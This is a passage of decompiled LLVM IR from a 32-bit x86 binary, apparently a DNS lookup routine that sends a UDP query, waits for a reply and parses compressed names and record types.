  %v1_804f44d = add i32 %v1_804f44c, -8
  %v2_804f44d = inttoptr i32 %v1_804f44d to i32*
  store i32 0, i32* %v2_804f44d, align 4
  %v1_804f44f = add i32 %v1_804f44c, -12
  %v2_804f44f = inttoptr i32 %v1_804f44f to i32*
  store i32 2, i32* %v2_804f44f, align 4
  %v1_804f451 = add i32 %v1_804f44c, -16
  %v2_804f451 = inttoptr i32 %v1_804f451 to i32*
  store i32 2, i32* %v2_804f451, align 4
  %v3_804f453 = call i32 @function_8052985(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f453, i32* %eax.global-to-local, align 4
  %v0_804f458 = load i32, i32* @esp, align 4
  store i32 %v3_804f453, i32* @ebp, align 4
  %v10_804f45d = icmp eq i32 %v3_804f453, -1
  br i1 %v10_804f45d, label %dec_label_pc_804f580, label %dec_label_pc_804f466

dec_label_pc_804f466:                             ; preds = %dec_label_pc_804f44c
  %v0_804f466 = load i32, i32* @ecx, align 4
  %v2_804f466 = add i32 %v0_804f458, 12
  %v3_804f466 = inttoptr i32 %v2_804f466 to i32*
  store i32 %v0_804f466, i32* %v3_804f466, align 4
  %v1_804f467 = add i32 %v0_804f458, 8
  %v2_804f467 = inttoptr i32 %v1_804f467 to i32*
  store i32 16, i32* %v2_804f467, align 4
  %v1_804f469 = add i32 %v0_804f458, 4272
  store i32 %v1_804f469, i32* @edi, align 4
  %v2_804f470 = add i32 %v0_804f458, 4
  %v3_804f470 = inttoptr i32 %v2_804f470 to i32*
  store i32 %v1_804f469, i32* %v3_804f470, align 4
  %v3_804f471 = inttoptr i32 %v0_804f458 to i32*
  store i32 %v3_804f453, i32* %v3_804f471, align 4
  %v3_804f472 = call i32 @function_80527aa(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f477 = load i32, i32* @esp, align 4
  %v1_804f47a = add i32 %v3_804f472, 1
  %v8_804f47a = icmp eq i32 %v1_804f47a, 0
  store i32 %v1_804f47a, i32* %eax.global-to-local, align 4
  br i1 %v8_804f47a, label %dec_label_pc_804f580, label %dec_label_pc_804f481

dec_label_pc_804f481:                             ; preds = %dec_label_pc_804f466
  %v1_804f481 = add i32 %v0_804f477, 12
  %v2_804f481 = inttoptr i32 %v1_804f481 to i32*
  store i32 16384, i32* %v2_804f481, align 4
  %v1_804f486 = add i32 %v0_804f477, 20
  %v2_804f486 = inttoptr i32 %v1_804f486 to i32*
  %v3_804f486 = load i32, i32* %v2_804f486, align 4
  store i32 %v3_804f486, i32* %edx.global-to-local, align 4
  %v2_804f48a = add i32 %v0_804f477, 8
  %v3_804f48a = inttoptr i32 %v2_804f48a to i32*
  store i32 %v3_804f486, i32* %v3_804f48a, align 4
  %v1_804f48b = add i32 %v0_804f477, 2096
  store i32 %v1_804f48b, i32* %eax.global-to-local, align 4
  %v2_804f492 = add i32 %v0_804f477, 4
  %v3_804f492 = inttoptr i32 %v2_804f492 to i32*
  store i32 %v1_804f48b, i32* %v3_804f492, align 4
  %v0_804f493 = load i32, i32* @ebp, align 4
  %v3_804f493 = inttoptr i32 %v0_804f477 to i32*
  store i32 %v0_804f493, i32* %v3_804f493, align 4
  %v0_804f494 = call i32 @function_80528d4()
  %v0_804f499 = load i32, i32* @esp, align 4
  %v1_804f49c = add i32 %v0_804f494, 1
  %v8_804f49c = icmp eq i32 %v1_804f49c, 0
  store i32 %v1_804f49c, i32* %eax.global-to-local, align 4
  br i1 %v8_804f49c, label %dec_label_pc_804f580, label %dec_label_pc_804f4a3

dec_label_pc_804f4a3:                             ; preds = %dec_label_pc_804f481
  %v2_804f4a3 = add i32 %v0_804f499, 12
  %v3_804f4a3 = inttoptr i32 %v2_804f4a3 to i32*
  store i32 %v1_804f49c, i32* %v3_804f4a3, align 4
  %v1_804f4a4 = add i32 %v0_804f499, 8
  %v2_804f4a4 = inttoptr i32 %v1_804f4a4 to i32*
  store i32 0, i32* %v2_804f4a4, align 4
  %v0_804f4a6 = load i32, i32* @ebp, align 4
  %v2_804f4a6 = add i32 %v0_804f499, 4
  %v3_804f4a6 = inttoptr i32 %v2_804f4a6 to i32*
  store i32 %v0_804f4a6, i32* %v3_804f4a6, align 4
  %v2_804f4a7 = inttoptr i32 %v0_804f499 to i32*
  store i32 3, i32* %v2_804f4a7, align 4
  %v3_804f4a9 = call i32 @function_80520cd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4ae = load i32, i32* @esp, align 4
  %v12_804f4b1 = or i32 %v3_804f4a9, 2048
  store i32 %v12_804f4b1, i32* %eax.global-to-local, align 4
  %v2_804f4b4 = add i32 %v0_804f4ae, 8
  %v3_804f4b4 = inttoptr i32 %v2_804f4b4 to i32*
  store i32 %v12_804f4b1, i32* %v3_804f4b4, align 4
  %v0_804f4b5 = load i32, i32* @ebp, align 4
  %v2_804f4b5 = add i32 %v0_804f4ae, 4
  %v3_804f4b5 = inttoptr i32 %v2_804f4b5 to i32*
  store i32 %v0_804f4b5, i32* %v3_804f4b5, align 4
  %v2_804f4b6 = inttoptr i32 %v0_804f4ae to i32*
  store i32 4, i32* %v2_804f4b6, align 4
  %v3_804f4b8 = call i32 @function_80520cd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4bd = load i32, i32* @esp, align 4
  %v1_804f4bd = add i32 %v0_804f4bd, 4144
  store i32 %v1_804f4bd, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804f4cb = inttoptr i32 %v1_804f4bd to i8*
  store i32 %v1_804f4bd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f4ce = call i8* @_memset(i8* %v1_804f4cb, i32 0, i32 32)
  %v6_804f4ce = ptrtoint i8* %v5_804f4ce to i32
  store i32 %v6_804f4ce, i32* %ecx.global-to-local, align 4
  %v0_804f4d0 = load i32, i32* @ebp, align 4
  %v2_804f4d4 = udiv i32 %v0_804f4d0, 32
  store i32 %v2_804f4d4, i32* @esi, align 4
  %v1_804f4d7 = urem i32 %v0_804f4d0, 32
  store i32 %v1_804f4d7, i32* @ebx, align 4
  %v0_804f4da = load i32, i32* @esp, align 4
  %v2_804f4da = mul nuw nsw i32 %v2_804f4d4, 4
  %v3_804f4da = add nuw nsw i32 %v2_804f4da, 4144
  %v4_804f4da = add i32 %v3_804f4da, %v0_804f4da
  %v5_804f4da = inttoptr i32 %v4_804f4da to i32*
  %v6_804f4da = load i32, i32* %v5_804f4da, align 4
  %v9_804f4da = shl i32 1, %v1_804f4d7
  %v12_804f4da = or i32 %v6_804f4da, %v9_804f4da
  store i32 %v12_804f4da, i32* %v5_804f4da, align 4
  %v0_804f4e2 = load i32, i32* @esp, align 4
  %v1_804f4e2 = add i32 %v0_804f4e2, 4288
  %v2_804f4e2 = inttoptr i32 %v1_804f4e2 to i32*
  store i32 5, i32* %v2_804f4e2, align 4
  %v0_804f4ed = load i32, i32* @esp, align 4
  %v1_804f4ed = add i32 %v0_804f4ed, 4292
  %v2_804f4ed = inttoptr i32 %v1_804f4ed to i32*
  store i32 0, i32* %v2_804f4ed, align 4
  %v0_804f4f8 = load i32, i32* @esp, align 4
  %v1_804f4f8 = inttoptr i32 %v0_804f4f8 to i32*
  %v1_804f4f9 = add i32 %v0_804f4f8, 4288
  store i32 %v1_804f4f9, i32* %v1_804f4f8, align 4
  %v0_804f501 = load i32, i32* @ebp, align 4
  %v1_804f501 = add i32 %v0_804f501, 1
  store i32 %v1_804f501, i32* %eax.global-to-local, align 4
  %v1_804f504 = add i32 %v0_804f4f8, -4
  %v2_804f504 = inttoptr i32 %v1_804f504 to i32*
  store i32 0, i32* %v2_804f504, align 4
  %v1_804f506 = add i32 %v0_804f4f8, -8
  %v2_804f506 = inttoptr i32 %v1_804f506 to i32*
  store i32 0, i32* %v2_804f506, align 4
  %v0_804f508 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f508 = add i32 %v0_804f4f8, -12
  %v3_804f508 = inttoptr i32 %v2_804f508 to i32*
  store i32 %v0_804f508, i32* %v3_804f508, align 4
  %v0_804f509 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f509 = add i32 %v0_804f4f8, -16
  %v3_804f509 = inttoptr i32 %v2_804f509 to i32*
  store i32 %v0_804f509, i32* %v3_804f509, align 4
  %v0_804f50a = call i32 @function_8052398()
  store i32 %v0_804f50a, i32* %eax.global-to-local, align 4
  %v0_804f50f = load i32, i32* @esp, align 4
  %v1_804f50f = add i32 %v0_804f50f, 32
  %v10_804f512 = icmp eq i32 %v0_804f50a, -1
  br i1 %v10_804f512, label %dec_label_pc_804f594, label %dec_label_pc_804f517

dec_label_pc_804f517:                             ; preds = %dec_label_pc_804f4a3
  %v1_804f517 = icmp eq i32 %v0_804f50a, 0
  br i1 %v1_804f517, label %dec_label_pc_804f55e, label %dec_label_pc_804f51b

dec_label_pc_804f51b:                             ; preds = %dec_label_pc_804f517
  %v1_804f51b = load i32, i32* @esi, align 4
  %v2_804f51b = mul i32 %v1_804f51b, 4
  %v3_804f51b = add i32 %v0_804f50f, 4160
  %v4_804f51b = add i32 %v3_804f51b, %v2_804f51b
  %v5_804f51b = inttoptr i32 %v4_804f51b to i32*
  %v6_804f51b = load i32, i32* %v5_804f51b, align 4
  %v7_804f51b = load i32, i32* @ebx, align 4
  %v8_804f51b = urem i32 %v7_804f51b, 32
  %v9_804f51b = shl i32 1, %v8_804f51b
  %v10_804f51b = and i32 %v9_804f51b, %v6_804f51b
  %v11_804f51b = icmp ne i32 %v10_804f51b, 0
  %v1_804f523 = zext i1 %v11_804f51b to i32
  %v3_804f523 = and i32 %v0_804f50a, -256
  %v4_804f523 = or i32 %v1_804f523, %v3_804f523
  store i32 %v4_804f523, i32* %eax.global-to-local, align 4
  %v4_804f526 = icmp eq i1 %v11_804f51b, false
  br i1 %v4_804f526, label %dec_label_pc_804f594, label %dec_label_pc_804f52a

dec_label_pc_804f52a:                             ; preds = %dec_label_pc_804f51b
  %v2_804f52a = add i32 %v0_804f50f, 28
  %v3_804f52a = inttoptr i32 %v2_804f52a to i32*
  store i32 %v4_804f523, i32* %v3_804f52a, align 4
  %v0_804f52b = load i32, i32* %eax.global-to-local, align 4
  %v2_804f52b = add i32 %v0_804f50f, 24
  %v3_804f52b = inttoptr i32 %v2_804f52b to i32*
  store i32 %v0_804f52b, i32* %v3_804f52b, align 4
  %v1_804f52c = add i32 %v0_804f50f, 20
  %v2_804f52c = inttoptr i32 %v1_804f52c to i32*
  store i32 0, i32* %v2_804f52c, align 4
  %v1_804f52e = add i32 %v0_804f50f, 16
  %v2_804f52e = inttoptr i32 %v1_804f52e to i32*
  store i32 0, i32* %v2_804f52e, align 4
  %v1_804f530 = add i32 %v0_804f50f, 12
  %v2_804f530 = inttoptr i32 %v1_804f530 to i32*
  store i32 16384, i32* %v2_804f530, align 4
  %v1_804f535 = add i32 %v0_804f50f, 8
  %v2_804f535 = inttoptr i32 %v1_804f535 to i32*
  store i32 2048, i32* %v2_804f535, align 4
  %v1_804f53a = add i32 %v0_804f50f, 64
  store i32 %v1_804f53a, i32* %eax.global-to-local, align 4
  %v2_804f53e = add i32 %v0_804f50f, 4
  %v3_804f53e = inttoptr i32 %v2_804f53e to i32*
  store i32 %v1_804f53a, i32* %v3_804f53e, align 4
  %v0_804f53f = load i32, i32* @ebp, align 4
  %v3_804f53f = inttoptr i32 %v0_804f50f to i32*
  store i32 %v0_804f53f, i32* %v3_804f53f, align 4
  %v0_804f540 = call i32 @function_8052891()
  store i32 %v0_804f540, i32* %eax.global-to-local, align 4
  %v0_804f545 = load i32, i32* @esp, align 4
  store i32 %v0_804f540, i32* @ebx, align 4
  %v1_804f54a = add i32 %v0_804f545, 56
  %v2_804f54a = inttoptr i32 %v1_804f54a to i32*
  %v3_804f54a = load i32, i32* %v2_804f54a, align 4
  store i32 %v3_804f54a, i32* %eax.global-to-local, align 4
  %v2_804f54e = add i32 %v0_804f545, 16
  %v3_804f54e = inttoptr i32 %v2_804f54e to i32*
  store i32 %v3_804f54a, i32* %v3_804f54e, align 4
  %v2_804f54f = call i32 @function_8051bf0(i8* inttoptr (i32 1 to i8*))
  %v1_804f554 = add i32 %v2_804f54f, 17
  store i32 %v1_804f554, i32* %eax.global-to-local, align 4
  %v0_804f557 = load i32, i32* @esp, align 4
  %v1_804f557 = add i32 %v0_804f557, 16
  %v0_804f55a = load i32, i32* @ebx, align 4
  %v7_804f55a = icmp ult i32 %v0_804f55a, %v1_804f554
  %v1_804f55c = icmp eq i1 %v7_804f55a, false
  br i1 %v1_804f55c, label %dec_label_pc_804f5ba, label %dec_label_pc_804f55e

dec_label_pc_804f55e:                             ; preds = %dec_label_pc_804f5e6, %dec_label_pc_804f5ba, %dec_label_pc_804f52a, %dec_label_pc_804f517
  %v0_804f55e = phi i32 [ %v1_804f5d3, %dec_label_pc_804f5e6 ], [ %v1_804f5d3, %dec_label_pc_804f5ba ], [ %v1_804f557, %dec_label_pc_804f52a ], [ %v1_804f50f, %dec_label_pc_804f517 ]
  %v1_804f55e = add i32 %v0_804f55e, 8
  %v2_804f55e = inttoptr i32 %v1_804f55e to i32*
  %v3_804f55e = load i32, i32* %v2_804f55e, align 4
  %v12_804f55e = icmp eq i32 %v3_804f55e, 5
  br i1 %v12_804f55e, label %dec_label_pc_804f594, label %dec_label_pc_804f565

dec_label_pc_804f565:                             ; preds = %dec_label_pc_804f580, %dec_label_pc_804f55e
  %v3_804f565 = phi i32 [ %v3_804f58d, %dec_label_pc_804f580 ], [ %v3_804f55e, %dec_label_pc_804f55e ]
  %v1_804f56d = phi i32 [ %v1_804f58a, %dec_label_pc_804f580 ], [ %v0_804f55e, %dec_label_pc_804f55e ]
  %v1_804f565 = add i32 %v1_804f56d, 8
  %v2_804f565 = inttoptr i32 %v1_804f565 to i32*
  %v1_804f569 = add i32 %v3_804f565, 1
  store i32 %v1_804f569, i32* @edi, align 4
  %v0_804f56a = load i32, i32* @ebp, align 4
  %v10_804f56a = icmp eq i32 %v0_804f56a, -1
  store i32 %v1_804f569, i32* %v2_804f565, align 4
  %v1_804f571 = icmp eq i1 %v10_804f56a, false
  br i1 %v1_804f571, label %dec_label_pc_804f440.loopexit, label %dec_label_pc_804f44c

dec_label_pc_804f580:                             ; preds = %dec_label_pc_804f481, %dec_label_pc_804f466, %dec_label_pc_804f44c
  %v0_804f580.in = phi i32 [ %v0_804f499, %dec_label_pc_804f481 ], [ %v0_804f477, %dec_label_pc_804f466 ], [ %v0_804f458, %dec_label_pc_804f44c ]
  %v2_804f583 = inttoptr i32 %v0_804f580.in to i32*
  store i32 1, i32* %v2_804f583, align 4
  %v1_804f585 = call i32 @function_8053d40(i32 1)
  store i32 %v1_804f585, i32* %eax.global-to-local, align 4
  %v0_804f58a = load i32, i32* @esp, align 4
  %v1_804f58a = add i32 %v0_804f58a, 16
  %v1_804f58d = add i32 %v0_804f58a, 24
  %v2_804f58d = inttoptr i32 %v1_804f58d to i32*
  %v3_804f58d = load i32, i32* %v2_804f58d, align 4
  %v12_804f58d = icmp eq i32 %v3_804f58d, 5
  %v1_804f592 = icmp eq i1 %v12_804f58d, false
  br i1 %v1_804f592, label %dec_label_pc_804f565, label %dec_label_pc_804f594

dec_label_pc_804f594:                             ; preds = %dec_label_pc_804f580, %dec_label_pc_804f55e, %dec_label_pc_804f51b, %dec_label_pc_804f4a3, %dec_label_pc_804f5f4, %dec_label_pc_804f5fd.backedge
  %v0_804f594 = phi i32 [ %v0_804f602122, %dec_label_pc_804f5f4 ], [ %v0_804f602, %dec_label_pc_804f5fd.backedge ], [ %v1_804f58a, %dec_label_pc_804f580 ], [ %v0_804f55e, %dec_label_pc_804f55e ], [ %v1_804f50f, %dec_label_pc_804f51b ], [ %v1_804f50f, %dec_label_pc_804f4a3 ]
  %v0_804f597 = load i32, i32* @ebp, align 4
  %v2_804f597 = add i32 %v0_804f594, -16
  %v3_804f597 = inttoptr i32 %v2_804f597 to i32*
  store i32 %v0_804f597, i32* %v3_804f597, align 4
  %v1_804f598 = call i32 @function_8052191(i32 1)
  store i32 %v1_804f598, i32* %eax.global-to-local, align 4
  %v0_804f59d = load i32, i32* @esp, align 4
  %v1_804f59d = add i32 %v0_804f59d, 16
  %v1_804f5a0 = inttoptr i32 %v1_804f59d to i32*
  %v2_804f5a0 = load i32, i32* %v1_804f5a0, align 4
  store i32 %v2_804f5a0, i32* %edx.global-to-local, align 4
  %v1_804f5a3 = inttoptr i32 %v2_804f5a0 to i8*
  %v2_804f5a3 = load i8, i8* %v1_804f5a3, align 1
  %v3_804f5a3 = icmp eq i8 %v2_804f5a3, 0
  br i1 %v3_804f5a3, label %dec_label_pc_804f6a3, label %dec_label_pc_804f5ac

dec_label_pc_804f5ac:                             ; preds = %dec_label_pc_804f594
  %v2_804f5ac = load i32, i32* %v1_804f5a0, align 4
  store i32 %v2_804f5ac, i32* %eax.global-to-local, align 4
  %v1_804f5af = add i32 %v0_804f59d, 4300
  %v1_804f5b5 = inttoptr i32 %v1_804f5af to i32*
  %v2_804f5b5 = load i32, i32* %v1_804f5b5, align 4
  store i32 %v2_804f5b5, i32* @ebx, align 4
  %v3_804f5b6 = add i32 %v0_804f59d, 4308
  %v1_804f5b7 = inttoptr i32 %v3_804f5b6 to i32*
  %v2_804f5b7 = load i32, i32* %v1_804f5b7, align 4
  store i32 %v2_804f5b7, i32* @edi, align 4
  %v3_804f5b7 = add i32 %v0_804f59d, 4312
  %v1_804f5b8 = inttoptr i32 %v3_804f5b7 to i32*
  %v2_804f5b8 = load i32, i32* %v1_804f5b8, align 4
  store i32 %v2_804f5b8, i32* @ebp, align 4
  ret i32 %v2_804f5ac

dec_label_pc_804f5ba:                             ; preds = %dec_label_pc_804f52a
  %v1_804f5ba = add i32 %v0_804f557, 60
  store i32 %v1_804f5ba, i32* %edx.global-to-local, align 4
  %v2_804f5be = add i32 %v0_804f557, 40
  %v3_804f5be = inttoptr i32 %v2_804f5be to i32*
  store i32 %v1_804f5ba, i32* %v3_804f5be, align 4
  %v0_804f5c2 = load i32, i32* @esp, align 4
  %v1_804f5c5 = add i32 %v0_804f5c2, 44
  store i32 %v1_804f5c5, i32* %ecx.global-to-local, align 4
  %v2_804f5c9 = add i32 %v0_804f5c2, -16
  %v3_804f5c9 = inttoptr i32 %v2_804f5c9 to i32*
  store i32 %v1_804f5c5, i32* %v3_804f5c9, align 4
  %v2_804f5ca = call i32 @function_8051bf0(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804f5ca, i32* %eax.global-to-local, align 4
  %v0_804f5cf = load i32, i32* @esp, align 4
  %v2_804f5cf = add i32 %v2_804f5ca, 65
  %v3_804f5cf = add i32 %v2_804f5cf, %v0_804f5cf
  store i32 %v3_804f5cf, i32* %ecx.global-to-local, align 4
  %v1_804f5d3 = add i32 %v0_804f5cf, 16
  %v1_804f5d6 = add i32 %v0_804f5cf, 30
  %v2_804f5d6 = inttoptr i32 %v1_804f5d6 to i16*
  %v3_804f5d6 = load i16, i16* %v2_804f5d6, align 2
  %v4_804f5d6 = zext i16 %v3_804f5d6 to i32
  %v7_804f5d6 = and i32 %v1_804f4bd, -65536
  %v8_804f5d6 = or i32 %v4_804f5d6, %v7_804f5d6
  store i32 %v8_804f5d6, i32* @edi, align 4
  %v3_804f5db = add i32 %v0_804f5cf, 48
  %v4_804f5db = inttoptr i32 %v3_804f5db to i16*
  %v5_804f5db = load i16, i16* %v4_804f5db, align 2
  %v16_804f5db = icmp eq i16 %v3_804f5d6, %v5_804f5db
  %v1_804f5e0 = icmp eq i1 %v16_804f5db, false
  br i1 %v1_804f5e0, label %dec_label_pc_804f55e, label %dec_label_pc_804f5e6

dec_label_pc_804f5e6:                             ; preds = %dec_label_pc_804f5ba
  %v1_804f5e6 = add i32 %v0_804f5cf, 54
  %v2_804f5e6 = inttoptr i32 %v1_804f5e6 to i16*
  %v3_804f5e6 = load i16, i16* %v2_804f5e6, align 2
  %v4_804f5e6 = zext i16 %v3_804f5e6 to i32
  %v6_804f5e6 = and i32 %v2_804f5ca, -65536
  %v7_804f5e6 = or i32 %v4_804f5e6, %v6_804f5e6
  store i32 %v7_804f5e6, i32* %eax.global-to-local, align 4
  %v4_804f5eb = icmp eq i16 %v3_804f5e6, 0
  br i1 %v4_804f5eb, label %dec_label_pc_804f55e, label %dec_label_pc_804f5f4

dec_label_pc_804f5f4:                             ; preds = %dec_label_pc_804f5e6
  %v2_804f5f4 = call i16 @llvm.bswap.i16(i16 %v3_804f5e6)
  %v3_804f5f4 = zext i16 %v2_804f5f4 to i32
  %v6_804f5f4 = or i32 %v3_804f5f4, %v6_804f5e6
  store i32 %v6_804f5f4, i32* %eax.global-to-local, align 4
  %v3_804f5f8 = add i32 %v0_804f5cf, 38
  %v4_804f5f8 = inttoptr i32 %v3_804f5f8 to i16*
  store i16 %v2_804f5f4, i16* %v4_804f5f8, align 2
  %v0_804f5fd117 = load i32, i32* @esp, align 4
  %v1_804f5fd118 = add i32 %v0_804f5fd117, 22
  %v2_804f5fd119 = inttoptr i32 %v1_804f5fd118 to i16*
  %v3_804f5fd120 = load i16, i16* %v2_804f5fd119, align 2
  %v4_804f5fd121 = add i16 %v3_804f5fd120, -1
  store i16 %v4_804f5fd121, i16* %v2_804f5fd119, align 2
  %v0_804f602122 = load i32, i32* @esp, align 4
  %v1_804f602123 = add i32 %v0_804f602122, 22
  %v2_804f602124 = inttoptr i32 %v1_804f602123 to i16*
  %v3_804f602125 = load i16, i16* %v2_804f602124, align 2
  %v13_804f602126 = icmp eq i16 %v3_804f602125, -1
  br i1 %v13_804f602126, label %dec_label_pc_804f594, label %dec_label_pc_804f60a

dec_label_pc_804f60a:                             ; preds = %dec_label_pc_804f5f4, %dec_label_pc_804f5fd.backedge
  %v0_804f602127 = phi i32 [ %v0_804f602, %dec_label_pc_804f5fd.backedge ], [ %v0_804f602122, %dec_label_pc_804f5f4 ]
  %v0_804f60a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f60a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f61311 = inttoptr i32 %v0_804f60a to i8*
  %v2_804f61312 = load i8, i8* %v1_804f61311, align 1
  %v3_804f61313 = zext i8 %v2_804f61312 to i32
  %v4_804f61314 = load i32, i32* %eax.global-to-local, align 4
  %v5_804f61315 = and i32 %v4_804f61314, -256
  %v6_804f61316 = or i32 %v5_804f61315, %v3_804f61313
  store i32 %v6_804f61316, i32* %eax.global-to-local, align 4
  %v4_804f61517 = icmp eq i8 %v2_804f61312, 0
  br i1 %v4_804f61517, label %dec_label_pc_804f64a, label %dec_label_pc_804f619.preheader.preheader

dec_label_pc_804f619.preheader.preheader:         ; preds = %dec_label_pc_804f60a
  %v1_804f63e = add i32 %v0_804f602127, 32
  br label %dec_label_pc_804f619.preheader

dec_label_pc_804f619.preheader:                   ; preds = %dec_label_pc_804f619.preheader.preheader, %dec_label_pc_804f6dc
  %v0_804f6e0 = phi i32 [ %v3_804f6e0, %dec_label_pc_804f6dc ], [ 1, %dec_label_pc_804f619.preheader.preheader ]
  %v0_804f6dd43 = phi i32 [ %v0_804f6dd, %dec_label_pc_804f6dc ], [ 0, %dec_label_pc_804f619.preheader.preheader ]
  %v0_804f62639 = phi i32 [ %v1_804f6dc, %dec_label_pc_804f6dc ], [ %v0_804f60a, %dec_label_pc_804f619.preheader.preheader ]
  %v0_804f61937 = phi i32 [ %v6_804f613, %dec_label_pc_804f6dc ], [ %v6_804f61316, %dec_label_pc_804f619.preheader.preheader ]
  br label %dec_label_pc_804f619

dec_label_pc_804f619:                             ; preds = %dec_label_pc_804f619.preheader, %dec_label_pc_804f621
  %v0_804f6dd = phi i32 [ %v0_804f6dd43, %dec_label_pc_804f619.preheader ], [ 1, %dec_label_pc_804f621 ]
  %v0_804f6dc = phi i32 [ %v0_804f62639, %dec_label_pc_804f619.preheader ], [ %v2_804f642, %dec_label_pc_804f621 ]
  %v4_804f613 = phi i32 [ %v0_804f61937, %dec_label_pc_804f619.preheader ], [ %v6_804f644, %dec_label_pc_804f621 ]
  %v1_804f619 = trunc i32 %v4_804f613 to i8
  %tmp139 = icmp ult i8 %v1_804f619, -64
  br i1 %tmp139, label %dec_label_pc_804f6dc, label %dec_label_pc_804f621

dec_label_pc_804f621:                             ; preds = %dec_label_pc_804f619
  %v1_804f621 = urem i32 %v4_804f613, 256
  store i32 %v1_804f621, i32* %eax.global-to-local, align 4
  %v1_804f626 = add i32 %v0_804f6dc, 1
  %v2_804f626 = inttoptr i32 %v1_804f626 to i8*
  %v3_804f626 = load i8, i8* %v2_804f626, align 1
  %v4_804f626 = zext i8 %v3_804f626 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804f634 = mul nuw nsw i32 %v1_804f621, 256
  %v2_804f637 = add nsw i32 %v2_804f634, -49152
  %v3_804f637 = or i32 %v4_804f626, %v2_804f637
  store i32 %v3_804f637, i32* %eax.global-to-local, align 4
  %v2_804f642 = add i32 %v1_804f63e, %v3_804f637
  store i32 %v2_804f642, i32* %edx.global-to-local, align 4
  %v1_804f644 = inttoptr i32 %v2_804f642 to i8*
  %v2_804f644 = load i8, i8* %v1_804f644, align 1
  %v3_804f644 = zext i8 %v2_804f644 to i32
  %v6_804f644 = or i32 %v3_804f644, %v2_804f637
  store i32 %v6_804f644, i32* %eax.global-to-local, align 4
  %v4_804f646 = icmp eq i8 %v2_804f644, 0
  %v1_804f648 = icmp eq i1 %v4_804f646, false
  br i1 %v1_804f648, label %dec_label_pc_804f619, label %dec_label_pc_804f64a

dec_label_pc_804f64a:                             ; preds = %dec_label_pc_804f6dc, %dec_label_pc_804f621, %dec_label_pc_804f60a
  %v4_804f66623 = phi i32 [ %v6_804f61316, %dec_label_pc_804f60a ], [ %v6_804f644, %dec_label_pc_804f621 ], [ %v6_804f613, %dec_label_pc_804f6dc ]
  %v5_804f700 = phi i32 [ %v0_804f60a, %dec_label_pc_804f60a ], [ %v2_804f642, %dec_label_pc_804f621 ], [ %v1_804f6dc, %dec_label_pc_804f6dc ]
  %v1_804f64a = phi i32 [ 0, %dec_label_pc_804f60a ], [ 1, %dec_label_pc_804f621 ], [ %v0_804f6dd, %dec_label_pc_804f6dc ]
  %v0_804f64a = phi i32 [ 1, %dec_label_pc_804f60a ], [ %v0_804f6e0, %dec_label_pc_804f621 ], [ %v3_804f6e0, %dec_label_pc_804f6dc ]
  %v2_804f64a = add i32 %v1_804f64a, %v0_804f60a
  %v2_804f64c = add i32 %v2_804f64a, %v0_804f64a
  store i32 %v2_804f64c, i32* @esi, align 4
  %v1_804f64f = inttoptr i32 %v2_804f64c to i16*
  %v2_804f64f = load i16, i16* %v1_804f64f, align 2
  %v8_804f64f = icmp eq i16 %v2_804f64f, 256
  %v1_804f654 = add i32 %v2_804f64c, 10
  store i32 %v1_804f654, i32* @edi, align 4
  br i1 %v8_804f64f, label %dec_label_pc_804f6f4, label %dec_label_pc_804f65d

dec_label_pc_804f65d:                             ; preds = %dec_label_pc_804f6f4, %dec_label_pc_804f64a
  store i32 %v1_804f654, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f66620 = inttoptr i32 %v1_804f654 to i8*
  %v2_804f66621 = load i8, i8* %v1_804f66620, align 1
  %v3_804f66622 = zext i8 %v2_804f66621 to i32
  %v5_804f66624 = and i32 %v4_804f66623, -256
  %v6_804f66625 = or i32 %v3_804f66622, %v5_804f66624
  store i32 %v6_804f66625, i32* %eax.global-to-local, align 4
  %v4_804f66826 = icmp eq i8 %v2_804f66621, 0
  br i1 %v4_804f66826, label %dec_label_pc_804f699, label %dec_label_pc_804f66c.preheader.preheader

dec_label_pc_804f66c.preheader.preheader:         ; preds = %dec_label_pc_804f65d
  %v1_804f68d = add i32 %v0_804f602127, 32
  br label %dec_label_pc_804f66c.preheader

dec_label_pc_804f66c.preheader:                   ; preds = %dec_label_pc_804f66c.preheader.preheader, %dec_label_pc_804f6e8
  %v0_804f6ec = phi i32 [ %v3_804f6ec, %dec_label_pc_804f6e8 ], [ 1, %dec_label_pc_804f66c.preheader.preheader ]
  %v0_804f6e962 = phi i32 [ %v0_804f6e9, %dec_label_pc_804f6e8 ], [ 0, %dec_label_pc_804f66c.preheader.preheader ]
  %v0_804f67558 = phi i32 [ %v1_804f6e8, %dec_label_pc_804f6e8 ], [ %v1_804f654, %dec_label_pc_804f66c.preheader.preheader ]
  %v0_804f66c56 = phi i32 [ %v6_804f666, %dec_label_pc_804f6e8 ], [ %v6_804f66625, %dec_label_pc_804f66c.preheader.preheader ]
  br label %dec_label_pc_804f66c

dec_label_pc_804f66c:                             ; preds = %dec_label_pc_804f66c.preheader, %dec_label_pc_804f670
  %v0_804f6e9 = phi i32 [ %v0_804f6e962, %dec_label_pc_804f66c.preheader ], [ 1, %dec_label_pc_804f670 ]
  %v0_804f6e8 = phi i32 [ %v0_804f67558, %dec_label_pc_804f66c.preheader ], [ %v2_804f691, %dec_label_pc_804f670 ]
  %v4_804f666 = phi i32 [ %v0_804f66c56, %dec_label_pc_804f66c.preheader ], [ %v6_804f693, %dec_label_pc_804f670 ]
  %v1_804f66c = trunc i32 %v4_804f666 to i8
  %tmp140 = icmp ult i8 %v1_804f66c, -64
  br i1 %tmp140, label %dec_label_pc_804f6e8, label %dec_label_pc_804f670

dec_label_pc_804f670:                             ; preds = %dec_label_pc_804f66c
  %v1_804f670 = urem i32 %v4_804f666, 256
  store i32 %v1_804f670, i32* %eax.global-to-local, align 4
